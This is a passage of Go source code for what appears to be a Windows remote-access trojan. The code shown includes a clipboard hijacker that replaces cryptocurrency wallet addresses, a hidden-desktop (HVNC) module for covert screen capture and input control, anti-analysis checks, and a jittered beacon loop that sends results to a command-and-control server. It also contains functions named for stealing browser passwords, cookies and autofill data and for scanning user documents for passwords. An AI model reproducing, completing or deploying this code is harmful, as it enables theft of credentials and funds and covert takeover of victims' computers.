				} else if strings.Contains(patternStr, "[13][a-km-zA-HJ-NP-Z1-9]") {
					cryptoType = "BTC-Legacy"
				} else if strings.Contains(patternStr, "ltc1[a-z0-9]") {
					cryptoType = "LTC-Bech32"
				} else if strings.Contains(patternStr, "[LM][a-km-zA-HJ-NP-Z1-9]") {
					cryptoType = "LTC-Legacy"
				} else if strings.Contains(patternStr, "[1-9A-HJ-NP-Za-km-z]{44}") {
					cryptoType = "SOL"
				} else {
					cryptoType = "Unknown"
				}

				// Replace all matches
				modifiedText = pattern.ReplaceAllString(originalText, replacement)
				replaced = true
				matchedAddress = matches[0] // Log first match
				break
			}
		}

		// If replacement occurred, update clipboard
		if replaced {
			// Small delay before writing
			time.Sleep(100 * time.Millisecond)

			// Try to open clipboard for writing
			for retryCount = 0; retryCount < 3; retryCount++ {
				ret, _, _ = openClipboard.Call(0)
				if ret != 0 {
					break
				}
				time.Sleep(50 * time.Millisecond)
			}

			if ret != 0 {
				// Empty clipboard first
				emptyClipboard.Call()

				// Allocate memory for new text
				newTextBytes := []byte(modifiedText + "\x00")
				hMem, _, _ := globalAlloc.Call(GMEM_MOVEABLE|GMEM_ZEROINIT, uintptr(len(newTextBytes)))

				if hMem != 0 {
					// Lock memory and copy text
					newPtr, _, _ := globalLock.Call(hMem)
					if newPtr != 0 {
						for i, b := range newTextBytes {
							*(*byte)(unsafe.Pointer(newPtr + uintptr(i))) = b
						}
						globalUnlock.Call(hMem)

						// Set clipboard data
						ret, _, _ = setClipboardData.Call(CF_TEXT, hMem)
						if ret != 0 {
							timestamp := time.Now().Format("15:04:05")
							replacements = append(replacements, fmt.Sprintf("%s: Replaced %s address '%s' with '%s'",
								timestamp, cryptoType, matchedAddress, modifiedText))
						}
					}
				}

				// Always close clipboard
				closeClipboard.Call()
			}
		}
	}

	if len(replacements) == 0 {
		result.Success = true
		result.Output = fmt.Sprintf("Clipboard replacement active for %d seconds - No crypto addresses detected", duration)
	} else {
		result.Success = true
		result.Output = fmt.Sprintf("Clipboard replacement made %d changes in %d seconds:\n\n%s",
			len(replacements), duration, strings.Join(replacements, "\n"))
	}

	return result
}

// =============================================================================
// HVNC (Hidden VNC) Implementation
// =============================================================================

// startHVNC creates a hidden desktop session
func (a *Agent) startHVNC(task *config.Task, result config.TaskResult) config.TaskResult {
	// Windows API constants
	const (
		DESKTOP_READOBJECTS     = 0x0001
		DESKTOP_CREATEWINDOW    = 0x0002
		DESKTOP_CREATEMENU      = 0x0004
		DESKTOP_HOOKCONTROL     = 0x0008
		DESKTOP_JOURNALRECORD   = 0x0010
		DESKTOP_JOURNALPLAYBACK = 0x0020
		DESKTOP_ENUMERATE       = 0x0040
		DESKTOP_WRITEOBJECTS    = 0x0080
		DESKTOP_SWITCHDESKTOP   = 0x0100
		GENERIC_ALL             = 0x10000000
	)

	// Load user32.dll
	user32 := syscall.NewLazyDLL("user32.dll")
	createDesktop := user32.NewProc("CreateDesktopW")

	// Generate unique desktop name
	desktopName := fmt.Sprintf("HVNC_%d", time.Now().Unix())
	desktopNamePtr, _ := syscall.UTF16PtrFromString(desktopName)

	// Create hidden desktop
	hDesktop, _, err := createDesktop.Call(
		uintptr(unsafe.Pointer(desktopNamePtr)), // Desktop name
		0,                                       // Device (NULL)
		0,                                       // Device mode (NULL)
		0,                                       // Flags
		GENERIC_ALL,                             // Access rights
		0,                                       // Security attributes (NULL)
	)

	if hDesktop == 0 {
		result.Success = false
		result.Error = fmt.Sprintf("Failed to create hidden desktop: %v", err)
		return result
	}

	// Detect actual screen resolution using GetSystemMetrics
	width, _, _ := procGetSystemMetrics.Call(0)  // SM_CXSCREEN
	height, _, _ := procGetSystemMetrics.Call(1) // SM_CYSCREEN

	// Get virtual screen dimensions (all monitors combined)
	virtualWidth, _, _ := procGetSystemMetrics.Call(78)  // SM_CXVIRTUALSCREEN
	virtualHeight, _, _ := procGetSystemMetrics.Call(79) // SM_CYVIRTUALSCREEN

	// Use virtual screen if available (multi-monitor), otherwise primary screen
	actualWidth := int(width)
	actualHeight := int(height)
	if virtualWidth > 0 && virtualHeight > 0 {
		actualWidth = int(virtualWidth)
		actualHeight = int(virtualHeight)
	}

	log.Printf("HVNC detected screen resolution: %dx%d (virtual: %dx%d)",
		int(width), int(height), actualWidth, actualHeight)

	// Create session configuration with detected resolution
	session := &config.HVNCSession{
		SessionID:   config.GenerateID(),
		DesktopName: desktopName,
		Active:      true,
		Width:       actualWidth,  // Use detected resolution
		Height:      actualHeight, // Use detected resolution
	}

	// Store session in agent
	a.hvncSession = session
	a.hvncDesktop = hDesktop

	result.Success = true
	result.Output = fmt.Sprintf("HVNC session started: %s\nDesktop: %s\nResolution: %dx%d (Primary: %dx%d, Virtual: %dx%d)",
		session.SessionID, session.DesktopName, actualWidth, actualHeight,
		int(width), int(height), int(virtualWidth), int(virtualHeight))

	log.Printf("HVNC session created: %s with resolution %dx%d", session.SessionID, actualWidth, actualHeight)
	return result
}

// stopHVNC closes the hidden desktop session
func (a *Agent) stopHVNC(task *config.Task, result config.TaskResult) config.TaskResult {
	if a.hvncSession == nil || !a.hvncSession.Active {
		result.Success = false
		result.Error = "No active HVNC session found"
		return result
	}

	// Load user32.dll
	user32 := syscall.NewLazyDLL("user32.dll")
	closeDesktop := user32.NewProc("CloseDesktop")

	// Close desktop handle
	if a.hvncDesktop != 0 {
		ret, _, _ := closeDesktop.Call(a.hvncDesktop)
		if ret == 0 {
			log.Printf("Warning: Failed to close desktop handle")
		}
	}

	sessionID := a.hvncSession.SessionID
	a.hvncSession = nil
	a.hvncDesktop = 0

	result.Success = true
	result.Output = fmt.Sprintf("HVNC session stopped: %s", sessionID)

	log.Printf("HVNC session closed: %s", sessionID)
	return result
}

// takeHVNCScreenshot captures screenshot from hidden desktop
func (a *Agent) takeHVNCScreenshot(task *config.Task, result config.TaskResult) config.TaskResult {
	if a.hvncSession == nil || !a.hvncSession.Active {
		result.Success = false
		result.Error = "No active HVNC session found"
		return result
	}

	// Load Windows APIs
	user32 := syscall.NewLazyDLL("user32.dll")
	gdi32 := syscall.NewLazyDLL("gdi32.dll")

	getDC := user32.NewProc("GetDC")
	releaseDC := user32.NewProc("ReleaseDC")
	createCompatibleDC := gdi32.NewProc("CreateCompatibleDC")
	createCompatibleBitmap := gdi32.NewProc("CreateCompatibleBitmap")
	selectObject := gdi32.NewProc("SelectObject")
	bitBlt := gdi32.NewProc("BitBlt")
	getDIBits := gdi32.NewProc("GetDIBits")
	deleteDC := gdi32.NewProc("DeleteDC")

	const (
		SRCCOPY        = 0x00CC0020
		DIB_RGB_COLORS = 0
	)

	// Get desktop DC - use NULL for entire virtual screen
	hDC, _, _ := getDC.Call(0)
	if hDC == 0 {
		result.Success = false
		result.Error = "Failed to get desktop DC"
		return result
	}
	defer releaseDC.Call(0, hDC)

	// Create compatible DC and bitmap
	hMemDC, _, _ := createCompatibleDC.Call(hDC)
	if hMemDC == 0 {
		result.Success = false
		result.Error = "Failed to create compatible DC"
		return result
	}
	defer deleteDC.Call(hMemDC)

	width := a.hvncSession.Width
	height := a.hvncSession.Height

	// Log capture details for debugging
	log.Printf("HVNC capturing screenshot: %dx%d", width, height)

	hBitmap, _, _ := createCompatibleBitmap.Call(hDC, uintptr(width), uintptr(height))
	if hBitmap == 0 {
		result.Success = false
		result.Error = "Failed to create compatible bitmap"
		return result
	}
	defer procDeleteObject.Call(hBitmap)

	// Select bitmap into memory DC
	selectObject.Call(hMemDC, hBitmap)

	// Get virtual screen coordinates for multi-monitor support
	virtualX, _, _ := procGetSystemMetrics.Call(76) // SM_XVIRTUALSCREEN
	virtualY, _, _ := procGetSystemMetrics.Call(77) // SM_YVIRTUALSCREEN

	// Copy virtual desktop to memory bitmap (includes all monitors)
	ret, _, _ := bitBlt.Call(
		hMemDC, 0, 0, uintptr(width), uintptr(height),
		hDC, uintptr(int(virtualX)), uintptr(int(virtualY)), SRCCOPY,
	)
	if ret == 0 {
		result.Success = false
		result.Error = "Failed to copy desktop to bitmap"
		return result
	}

	// Create bitmap info with proper format
	bi := BITMAPINFO{
		BmiHeader: BITMAPINFOHEADER{
			BiSize:        uint32(unsafe.Sizeof(BITMAPINFOHEADER{})),
			BiWidth:       int32(width),
			BiHeight:      int32(-height), // Negative for top-down
			BiPlanes:      1,
			BiBitCount:    24, // 24-bit RGB
			BiCompression: 0,  // BI_RGB
			BiSizeImage:   0,  // Can be 0 for BI_RGB
		},
	}

	// Calculate image size
	imageSize := width * height * 3

	// Allocate buffer for bitmap data
	imageData := make([]byte, imageSize)

	// Get bitmap bits
	ret, _, _ = getDIBits.Call(
		hDC,
		hBitmap,
		0,
		uintptr(height),
		uintptr(unsafe.Pointer(&imageData[0])),
		uintptr(unsafe.Pointer(&bi)),
		DIB_RGB_COLORS,
	)

	if ret == 0 {
		result.Success = false
		result.Error = "Failed to get bitmap data"
		return result
	}

	// Convert BGR to RGB and encode as PNG
	var buf bytes.Buffer
	img := image.NewRGBA(image.Rect(0, 0, width, height))

	for y := 0; y < height; y++ {
		for x := 0; x < width; x++ {
			offset := (y*width + x) * 3
			if offset+2 < len(imageData) {
				b := imageData[offset]
				g := imageData[offset+1]
				r := imageData[offset+2]
				img.Set(x, y, color.RGBA{R: r, G: g, B: b, A: 255})
			}
		}
	}

	if err := png.Encode(&buf, img); err != nil {
		result.Success = false
		result.Error = fmt.Sprintf("Failed to encode PNG: %v", err)
		return result
	}

	// Encode as base64
	encodedImage := base64.StdEncoding.EncodeToString(buf.Bytes())

	result.Success = true
	result.Output = fmt.Sprintf("HVNC screenshot captured (%dx%d, %d bytes, virtual offset: %dx%d)",
		width, height, len(buf.Bytes()), int(virtualX), int(virtualY))
	result.ScreenshotData = encodedImage

	log.Printf("HVNC screenshot completed: %dx%d, %d KB", width, height, len(buf.Bytes())/1024)
	return result
}

// handleHVNCMouse processes mouse events in hidden desktop
func (a *Agent) handleHVNCMouse(task *config.Task, result config.TaskResult) config.TaskResult {
	if a.hvncSession == nil || !a.hvncSession.Active {
		result.Success = false
		result.Error = "No active HVNC session found"
		return result
	}

	if task.HVNCMouse == nil {
		result.Success = false
		result.Error = "No mouse event data provided"
		return result
	}

	// Load user32.dll
	user32 := syscall.NewLazyDLL("user32.dll")
	setCursorPos := user32.NewProc("SetCursorPos")
	mouse_event := user32.NewProc("mouse_event")

	const (
		MOUSEEVENTF_LEFTDOWN   = 0x0002
		MOUSEEVENTF_LEFTUP     = 0x0004
		MOUSEEVENTF_RIGHTDOWN  = 0x0008
		MOUSEEVENTF_RIGHTUP    = 0x0010
		MOUSEEVENTF_MIDDLEDOWN = 0x0020
		MOUSEEVENTF_MIDDLEUP   = 0x0040
		MOUSEEVENTF_MOVE       = 0x0001
		MOUSEEVENTF_ABSOLUTE   = 0x8000
	)

	mouseEvent := task.HVNCMouse

	// Get virtual screen coordinates for proper multi-monitor mapping
	virtualX, _, _ := procGetSystemMetrics.Call(76) // SM_XVIRTUALSCREEN
	virtualY, _, _ := procGetSystemMetrics.Call(77) // SM_YVIRTUALSCREEN

	// Calculate absolute coordinates in virtual screen space
	absoluteX := int(virtualX) + mouseEvent.X
	absoluteY := int(virtualY) + mouseEvent.Y

	log.Printf("HVNC Mouse: Web coords (%d,%d) -> Virtual coords (%d,%d) [offset: %dx%d]",
		mouseEvent.X, mouseEvent.Y, absoluteX, absoluteY, int(virtualX), int(virtualY))

	// Move cursor to absolute position in virtual screen
	setCursorPos.Call(uintptr(absoluteX), uintptr(absoluteY))

	// Handle mouse actions
	var dwFlags uintptr

	switch mouseEvent.Action {
	case "move":
		dwFlags = MOUSEEVENTF_MOVE | MOUSEEVENTF_ABSOLUTE
		// For move, use normalized coordinates (0-65535 range)
		normalizedX := uint32((absoluteX * 65535) / int(a.hvncSession.Width))
		normalizedY := uint32((absoluteY * 65535) / int(a.hvncSession.Height))
		mouse_event.Call(dwFlags, uintptr(normalizedX), uintptr(normalizedY), 0, 0)

	case "click":
		switch mouseEvent.Button {
		case "left":
			dwFlags = MOUSEEVENTF_LEFTDOWN
			mouse_event.Call(dwFlags, uintptr(absoluteX), uintptr(absoluteY), 0, 0)
			time.Sleep(50 * time.Millisecond)
			dwFlags = MOUSEEVENTF_LEFTUP
		case "right":
			dwFlags = MOUSEEVENTF_RIGHTDOWN
			mouse_event.Call(dwFlags, uintptr(absoluteX), uintptr(absoluteY), 0, 0)
			time.Sleep(50 * time.Millisecond)
			dwFlags = MOUSEEVENTF_RIGHTUP
		case "middle":
			dwFlags = MOUSEEVENTF_MIDDLEDOWN
			mouse_event.Call(dwFlags, uintptr(absoluteX), uintptr(absoluteY), 0, 0)
			time.Sleep(50 * time.Millisecond)
			dwFlags = MOUSEEVENTF_MIDDLEUP
		}

	case "double":
		if mouseEvent.Button == "left" {
			// Double click with proper timing
			dwFlags = MOUSEEVENTF_LEFTDOWN
			mouse_event.Call(dwFlags, uintptr(absoluteX), uintptr(absoluteY), 0, 0)
			time.Sleep(50 * time.Millisecond)
			mouse_event.Call(MOUSEEVENTF_LEFTUP, uintptr(absoluteX), uintptr(absoluteY), 0, 0)
			time.Sleep(100 * time.Millisecond) // Longer delay between clicks for double-click recognition
			mouse_event.Call(MOUSEEVENTF_LEFTDOWN, uintptr(absoluteX), uintptr(absoluteY), 0, 0)
			time.Sleep(50 * time.Millisecond)
			dwFlags = MOUSEEVENTF_LEFTUP
		}

	case "down":
		switch mouseEvent.Button {
		case "left":
			dwFlags = MOUSEEVENTF_LEFTDOWN
		case "right":
			dwFlags = MOUSEEVENTF_RIGHTDOWN
		case "middle":
			dwFlags = MOUSEEVENTF_MIDDLEDOWN
		}

	case "up":
		switch mouseEvent.Button {
		case "left":
			dwFlags = MOUSEEVENTF_LEFTUP
		case "right":
			dwFlags = MOUSEEVENTF_RIGHTUP
		case "middle":
			dwFlags = MOUSEEVENTF_MIDDLEUP
		}
	}

	// Execute final mouse event if not already handled
	if mouseEvent.Action != "move" && mouseEvent.Action != "click" && mouseEvent.Action != "double" {
		mouse_event.Call(dwFlags, uintptr(absoluteX), uintptr(absoluteY), 0, 0)
	}

	result.Success = true
	result.Output = fmt.Sprintf("HVNC mouse event: %s %s at web(%d,%d) -> virtual(%d,%d)",
		mouseEvent.Action, mouseEvent.Button, mouseEvent.X, mouseEvent.Y, absoluteX, absoluteY)

	return result
}

// handleHVNCKeyboard processes keyboard events in hidden desktop
func (a *Agent) handleHVNCKeyboard(task *config.Task, result config.TaskResult) config.TaskResult {
	if a.hvncSession == nil || !a.hvncSession.Active {
		result.Success = false
		result.Error = "No active HVNC session found"
		return result
	}

	if task.HVNCKeyboard == nil {
		result.Success = false
		result.Error = "No keyboard event data provided"
		return result
	}

	// Load user32.dll
	user32 := syscall.NewLazyDLL("user32.dll")
	keybd_event := user32.NewProc("keybd_event")

	const (
		KEYEVENTF_KEYDOWN = 0x0000
		KEYEVENTF_KEYUP   = 0x0002
	)

	keyEvent := task.HVNCKeyboard

	if keyEvent.Action == "type" && keyEvent.Text != "" {
		// Type text character by character
		for _, char := range keyEvent.Text {
			vk := getVirtualKeyCode(char)
			if vk != 0 {
				keybd_event.Call(uintptr(vk), 0, KEYEVENTF_KEYDOWN, 0)
				time.Sleep(10 * time.Millisecond)
				keybd_event.Call(uintptr(vk), 0, KEYEVENTF_KEYUP, 0)
				time.Sleep(10 * time.Millisecond)
			}
		}
		result.Success = true
		result.Output = fmt.Sprintf("HVNC typed text: %s", keyEvent.Text)
	} else {
		// Handle specific key events
		vk := getVirtualKeyCodeFromName(keyEvent.Key)
		if vk == 0 {
			result.Success = false
			result.Error = fmt.Sprintf("Unknown key: %s", keyEvent.Key)
			return result
		}

		switch keyEvent.Action {
		case "press":
			keybd_event.Call(uintptr(vk), 0, KEYEVENTF_KEYDOWN, 0)
			time.Sleep(50 * time.Millisecond)
			keybd_event.Call(uintptr(vk), 0, KEYEVENTF_KEYUP, 0)
		case "down":
			keybd_event.Call(uintptr(vk), 0, KEYEVENTF_KEYDOWN, 0)
		case "up":
			keybd_event.Call(uintptr(vk), 0, KEYEVENTF_KEYUP, 0)
		}

		result.Success = true
		result.Output = fmt.Sprintf("HVNC key event: %s %s", keyEvent.Action, keyEvent.Key)
	}

	return result
}

// executeInHVNC runs a command/application in the hidden desktop
func (a *Agent) executeInHVNC(task *config.Task, result config.TaskResult) config.TaskResult {
	if a.hvncSession == nil || !a.hvncSession.Active {
		result.Success = false
		result.Error = "No active HVNC session found"
		return result
	}

	if task.Command == "" {
		result.Success = false
		result.Error = "No command provided"
		return result
	}

	// Load kernel32.dll and user32.dll
	kernel32 := syscall.NewLazyDLL("kernel32.dll")
	user32 := syscall.NewLazyDLL("user32.dll")

	createProcess := kernel32.NewProc("CreateProcessW")
	setThreadDesktop := user32.NewProc("SetThreadDesktop")
	getCurrentThread := kernel32.NewProc("GetCurrentThread")
	getThreadDesktop := user32.NewProc("GetThreadDesktop")

	// Get current thread desktop for restoration
	currentThread, _, _ := getCurrentThread.Call()
	originalDesktop, _, _ := getThreadDesktop.Call(currentThread, 0)

	// Switch to HVNC desktop
	ret, _, _ := setThreadDesktop.Call(a.hvncDesktop)
	if ret == 0 {
		result.Success = false
		result.Error = "Failed to switch to HVNC desktop"
		return result
	}

	// Prepare command
	commandPtr, _ := syscall.UTF16PtrFromString(task.Command)

	// Create process info structures
	var si syscall.StartupInfo
	var pi syscall.ProcessInformation
	si.Cb = uint32(unsafe.Sizeof(si))

	// Create process in hidden desktop
	ret, _, err := createProcess.Call(
		0,                                   // Application name
		uintptr(unsafe.Pointer(commandPtr)), // Command line
		0,                                   // Process security attributes
		0,                                   // Thread security attributes
		0,                                   // Inherit handles
		0,                                   // Creation flags
		0,                                   // Environment
		0,                                   // Current directory
		uintptr(unsafe.Pointer(&si)),        // Startup info
		uintptr(unsafe.Pointer(&pi)),        // Process info
	)

	// Restore original desktop
	setThreadDesktop.Call(originalDesktop)

	if ret == 0 {
		result.Success = false
		result.Error = fmt.Sprintf("Failed to create process: %v", err)
		return result
	}

	// Store process ID in session
	a.hvncSession.ProcessID = int(pi.ProcessId)

	result.Success = true
	result.Output = fmt.Sprintf("HVNC process started: %s (PID: %d)", task.Command, pi.ProcessId)

	log.Printf("HVNC process started: %s (PID: %d)", task.Command, pi.ProcessId)
	return result
}

// Helper function to get virtual key code from character
func getVirtualKeyCode(char rune) byte {
	switch char {
	case ' ':
		return 0x20 // VK_SPACE
	case '\n', '\r':
		return 0x0D // VK_RETURN
	case '\t':
		return 0x09 // VK_TAB
	case '\b':
		return 0x08 // VK_BACK
	default:
		if char >= 'A' && char <= 'Z' {
			return byte(char)
		}
		if char >= 'a' && char <= 'z' {
			return byte(char - 'a' + 'A')
		}
		if char >= '0' && char <= '9' {
			return byte(char)
		}
	}
	return 0
}

// Helper function to get virtual key code from key name
func getVirtualKeyCodeFromName(keyName string) byte {
	keyMap := map[string]byte{
		"enter":     0x0D, // VK_RETURN
		"space":     0x20, // VK_SPACE
		"tab":       0x09, // VK_TAB
		"backspace": 0x08, // VK_BACK
		"delete":    0x2E, // VK_DELETE
		"escape":    0x1B, // VK_ESCAPE
		"shift":     0x10, // VK_SHIFT
		"ctrl":      0x11, // VK_CONTROL
		"alt":       0x12, // VK_MENU
		"windows":   0x5B, // VK_LWIN
		"f1":        0x70, // VK_F1
		"f2":        0x71, // VK_F2
		"f3":        0x72, // VK_F3
		"f4":        0x73, // VK_F4
		"f5":        0x74, // VK_F5
		"f6":        0x75, // VK_F6
		"f7":        0x76, // VK_F7
		"f8":        0x77, // VK_F8
		"f9":        0x78, // VK_F9
		"f10":       0x79, // VK_F10
		"f11":       0x7A, // VK_F11
		"f12":       0x7B, // VK_F12
		"up":        0x26, // VK_UP
		"down":      0x28, // VK_DOWN
		"left":      0x25, // VK_LEFT
		"right":     0x27, // VK_RIGHT
		"home":      0x24, // VK_HOME
		"end":       0x23, // VK_END
		"pageup":    0x21, // VK_PRIOR
		"pagedown":  0x22, // VK_NEXT
	}

	if vk, exists := keyMap[strings.ToLower(keyName)]; exists {
		return vk
	}

	// Handle single characters
	if len(keyName) == 1 {
		return getVirtualKeyCode(rune(keyName[0]))
	}

	return 0
}

// Submit Task Result
func (a *Agent) submitResult(result config.TaskResult) error {
	data, err := json.Marshal(result)
	if err != nil {
		return err
	}

	resp, err := a.httpClient.Post(
		a.C2URL+config.ENDPOINT_RESULT,
		"application/json",
		bytes.NewBuffer(data),
	)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	return nil
}

// Main Loop
func (a *Agent) Start() {
	// Anti-analysis checks
	if !a.antiAnalysis() {
		log.Println("Analysis environment detected, exiting")
		return
	}

	// Add random delay before starting
	delay := time.Duration(rand.Intn(10)) * time.Second
	log.Printf("Waiting %v before starting...", delay)
	time.Sleep(delay)

	// Register with C2
	retries := 0
	for retries < config.MAX_RETRY_ATTEMPTS {
		if err := a.register(); err != nil {
			log.Printf("Registration failed (attempt %d): %v", retries+1, err)
			retries++
			time.Sleep(config.RETRY_DELAY)
			continue
		}
		break
	}

	if retries >= config.MAX_RETRY_ATTEMPTS {
		log.Println("Failed to register after maximum retries")
		return
	}

	a.Running = true
	log.Println("Agent started successfully")

	// Main beacon loop
	for a.Running {
		// Calculate jittered beacon interval
		interval := config.CalculateJitter(a.BeaconInterval, config.JITTER_PERCENTAGE)
		time.Sleep(interval)

		// Send beacon
		task, err := a.beacon()
		if err != nil {
			log.Printf("Beacon failed: %v", err)
			continue
		}

		// Execute task if received
		if task != nil {
			result := a.executeTask(task)

			// Submit result
			if err := a.submitResult(result); err != nil {
				log.Printf("Failed to submit result: %v", err)
			}
		}
	}

	log.Println("Agent terminated")
}

// Credential Theft Functions

// stealBrowserPasswords extracts saved passwords from major browsers
func (a *Agent) stealBrowserPasswords(task *config.Task, result config.TaskResult) config.TaskResult {
	if runtime.GOOS != "windows" {
		result.Success = false
		result.Error = "Browser password theft only supported on Windows"
		return result
	}

	var allPasswords []config.BrowserPassword
	var errors []string

	log.Printf("Starting browser password extraction...")

	// Chrome-based browsers
	chromePasswords, err := a.extractChromePasswords()
	if err != nil {
		errors = append(errors, "Chrome: "+err.Error())
		log.Printf("Chrome extraction failed: %v", err)
	} else {
		allPasswords = append(allPasswords, chromePasswords...)
		log.Printf("Chrome extraction successful: %d passwords", len(chromePasswords))
	}

	// Firefox passwords
	firefoxPasswords, err := a.extractFirefoxPasswords()
	if err != nil {
		errors = append(errors, "Firefox: "+err.Error())
		log.Printf("Firefox extraction failed: %v", err)
	} else {
		allPasswords = append(allPasswords, firefoxPasswords...)
		log.Printf("Firefox extraction successful: %d passwords", len(firefoxPasswords))
	}

	// Edge passwords
	edgePasswords, err := a.extractEdgePasswords()
	if err != nil {
		errors = append(errors, "Edge: "+err.Error())
		log.Printf("Edge extraction failed: %v", err)
	} else {
		allPasswords = append(allPasswords, edgePasswords...)
		log.Printf("Edge extraction successful: %d passwords", len(edgePasswords))
	}

	credentials := &config.StolenCredentials{
		BrowserPasswords: allPasswords,
		Timestamp:        time.Now().Unix(),
		AgentID:          a.ID,
	}

	result.CredentialData = credentials
	result.Success = len(allPasswords) > 0 || len(errors) == 0 // Success if we got passwords OR no errors occurred

	if len(allPasswords) > 0 {
		result.Output = fmt.Sprintf("Successfully extracted %d passwords from browsers", len(allPasswords))
		if len(errors) > 0 {
			result.Output += fmt.Sprintf(" (Errors: %s)", strings.Join(errors, "; "))
		}
		log.Printf("Password extraction complete: %d total passwords", len(allPasswords))
	} else {
		if len(errors) > 0 {
			result.Success = false
			result.Error = strings.Join(errors, "; ")
			result.Output = "Password extraction failed"
		} else {
			result.Success = true
			result.Output = "No passwords found in browsers"
		}
		log.Printf("Password extraction complete: no passwords found")
	}

	return result
}

// stealBrowserCookies extracts cookies from major browsers
func (a *Agent) stealBrowserCookies(task *config.Task, result config.TaskResult) config.TaskResult {
	if runtime.GOOS != "windows" {
		result.Success = false
		result.Error = "Browser cookie theft only supported on Windows"
		return result
	}

	var allCookies []config.BrowserCookie
	var errors []string

	// Chrome cookies
	chromeCookies, err := a.extractChromeCookies()
	if err != nil {
		errors = append(errors, "Chrome: "+err.Error())
	} else {
		allCookies = append(allCookies, chromeCookies...)
	}

	// Firefox cookies
	firefoxCookies, err := a.extractFirefoxCookies()
	if err != nil {
		errors = append(errors, "Firefox: "+err.Error())
	} else {
		allCookies = append(allCookies, firefoxCookies...)
	}

	// Edge cookies
	edgeCookies, err := a.extractEdgeCookies()
	if err != nil {
		errors = append(errors, "Edge: "+err.Error())
	} else {
		allCookies = append(allCookies, edgeCookies...)
	}

	credentials := &config.StolenCredentials{
		BrowserCookies: allCookies,
		Timestamp:      time.Now().Unix(),
		AgentID:        a.ID,
	}

	result.CredentialData = credentials
	result.Success = len(allCookies) > 0

	if len(allCookies) > 0 {
		result.Output = fmt.Sprintf("Successfully extracted %d cookies from browsers", len(allCookies))
		if len(errors) > 0 {
			result.Output += fmt.Sprintf(" (Errors: %s)", strings.Join(errors, "; "))
		}
	} else {
		result.Output = "No cookies found"
		if len(errors) > 0 {
			result.Error = strings.Join(errors, "; ")
		}
	}

	return result
}

// stealBrowserAutofill extracts autofill data from browsers
func (a *Agent) stealBrowserAutofill(task *config.Task, result config.TaskResult) config.TaskResult {
	if runtime.GOOS != "windows" {
		result.Success = false
		result.Error = "Browser autofill theft only supported on Windows"
		return result
	}

	var allAutofill []config.AutofillData
	var errors []string

	// Chrome autofill
	chromeAutofill, err := a.extractChromeAutofill()
	if err != nil {
		errors = append(errors, "Chrome: "+err.Error())
	} else {
		allAutofill = append(allAutofill, chromeAutofill...)
	}

	// Firefox autofill
	firefoxAutofill, err := a.extractFirefoxAutofill()
	if err != nil {
		errors = append(errors, "Firefox: "+err.Error())
	} else {
		allAutofill = append(allAutofill, firefoxAutofill...)
	}

	credentials := &config.StolenCredentials{
		AutofillData: allAutofill,
		Timestamp:    time.Now().Unix(),
		AgentID:      a.ID,
	}

	result.CredentialData = credentials
	result.Success = len(allAutofill) > 0

	if len(allAutofill) > 0 {
		result.Output = fmt.Sprintf("Successfully extracted %d autofill entries from browsers", len(allAutofill))
		if len(errors) > 0 {
			result.Output += fmt.Sprintf(" (Errors: %s)", strings.Join(errors, "; "))
		}
	} else {
		result.Output = "No autofill data found"
		if len(errors) > 0 {
			result.Error = strings.Join(errors, "; ")
		}
	}

	return result
}

// stealDocumentPasswords scans documents for passwords and sensitive data
func (a *Agent) stealDocumentPasswords(task *config.Task, result config.TaskResult) config.TaskResult {
	var allDocuments []config.DocumentPassword
	var errors []string

	// Common document locations
	searchPaths := []string{
		os.Getenv("USERPROFILE") + "\\Desktop",
		os.Getenv("USERPROFILE") + "\\Documents",
		os.Getenv("USERPROFILE") + "\\Downloads",
		"C:\\Users\\Public\\Documents",
	}

	// File extensions to search
	extensions := []string{".txt", ".doc", ".docx", ".pdf", ".rtf", ".odt"}

	for _, searchPath := range searchPaths {
		documents, err := a.scanDocumentsInPath(searchPath, extensions)
		if err != nil {
			errors = append(errors, fmt.Sprintf("Path %s: %s", searchPath, err.Error()))
			continue
		}
		allDocuments = append(allDocuments, documents...)
	}

	credentials := &config.StolenCredentials{
		DocumentData: allDocuments,
		Timestamp:    time.Now().Unix(),
		AgentID:      a.ID,
	}

	result.CredentialData = credentials
	result.Success = len(allDocuments) > 0

	if len(allDocuments) > 0 {
		result.Output = fmt.Sprintf("Successfully scanned %d documents for sensitive data", len(allDocuments))
		if len(errors) > 0 {
			result.Output += fmt.Sprintf(" (Errors: %s)", strings.Join(errors, "; "))
		}
	} else {
		result.Output = "No sensitive documents found"
		if len(errors) > 0 {
			result.Error = strings.Join(errors, "; ")
		}
	}

	return result
}

// stealAllCredentials performs comprehensive credential theft
func (a *Agent) stealAllCredentials(task *config.Task, result config.TaskResult) config.TaskResult {
	log.Printf("Starting comprehensive credential theft for agent %s", a.ID)

	var allCredentials config.StolenCredentials
	var errors []string
	var successCount int

	// Browser passwords
	if passwords, err := a.extractAllBrowserPasswords(); err != nil {
		errors = append(errors, "Browser passwords: "+err.Error())
	} else {
		allCredentials.BrowserPasswords = passwords
		successCount++
	}

	// Browser cookies
	if cookies, err := a.extractAllBrowserCookies(); err != nil {
		errors = append(errors, "Browser cookies: "+err.Error())
	} else {
		allCredentials.BrowserCookies = cookies
		successCount++
	}

	// Autofill data
	if autofill, err := a.extractAllBrowserAutofill(); err != nil {
		errors = append(errors, "Autofill data: "+err.Error())
	} else {
		allCredentials.AutofillData = autofill
		successCount++
	}

	// Document scanning
	if documents, err := a.extractAllDocumentPasswords(); err != nil {
		errors = append(errors, "Document scanning: "+err.Error())
	} else {
		allCredentials.DocumentData = documents
		successCount++
	}

	allCredentials.Timestamp = time.Now().Unix()
	allCredentials.AgentID = a.ID

	result.CredentialData = &allCredentials
	result.Success = successCount > 0

	totalItems := len(allCredentials.BrowserPasswords) + len(allCredentials.BrowserCookies) +
		len(allCredentials.AutofillData) + len(allCredentials.DocumentData)

	if totalItems > 0 {
		result.Output = fmt.Sprintf("Comprehensive theft complete: %d passwords, %d cookies, %d autofill entries, %d documents",
			len(allCredentials.BrowserPasswords), len(allCredentials.BrowserCookies),
			len(allCredentials.AutofillData), len(allCredentials.DocumentData))
		if len(errors) > 0 {
			result.Output += fmt.Sprintf(" (Errors: %s)", strings.Join(errors, "; "))
		}
	} else {
		result.Output = "No credentials found"
		if len(errors) > 0 {
			result.Error = strings.Join(errors, "; ")
		}
	}

	return result
}

// Helper functions for credential extraction

// extractChromePasswords extracts passwords from all Chromium-based browsers
func (a *Agent) extractChromePasswords() ([]config.BrowserPassword, error) {
	var passwords []config.BrowserPassword
	var lastError error

	// Comprehensive Chromium-based browser paths
	chromiumBrowsers := map[string][]string{
		"Chrome": {
